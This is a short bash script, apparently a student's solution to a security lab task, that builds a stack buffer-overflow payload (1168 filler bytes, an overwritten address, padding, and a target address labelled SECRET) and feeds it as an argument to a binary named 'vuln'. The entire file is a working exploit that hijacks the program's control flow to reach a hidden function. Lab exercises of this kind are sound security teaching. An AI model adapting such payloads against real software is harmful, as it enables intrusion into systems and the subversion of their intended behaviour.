#!/usr/bin/env bash

BUFFER=$(printf "a%.s" {1..1168})
F="\xf0\xd0\xff\xff"
#F='\x50\xcd\xff\xff'
PADDING=$(printf "a%.s" {1..24})
SECRET="\xc6\x91\x04\x08"

/task2/s2015345/vuln $(echo -en $BUFFER$F$PADDING$SECRET)
